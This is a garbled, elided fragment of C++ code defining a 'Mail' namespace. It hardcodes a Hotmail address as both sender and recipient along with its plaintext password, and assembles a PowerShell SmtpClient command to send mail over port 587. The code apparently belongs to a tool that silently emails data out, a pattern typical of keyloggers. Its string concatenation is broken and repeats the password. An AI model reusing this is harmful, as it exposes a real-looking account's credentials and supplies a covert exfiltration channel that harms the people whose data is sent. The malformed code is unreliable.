...
namespace Mail
{
    ...
    #define X_EM_TO "dave.radoicic@hotmail.com"
    #define X_EM_FROM "dave.radoicic@hotmail.com"
    #define X_EM_PASS "Sh@r320!8"
...
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.hotmail.com SSL\r\n "
...
"-password \"Sh@r320!8" +
 std::string (X_EM_PASS) +
  "\""
" -From \"dave.radoicic@hotmail.com" +
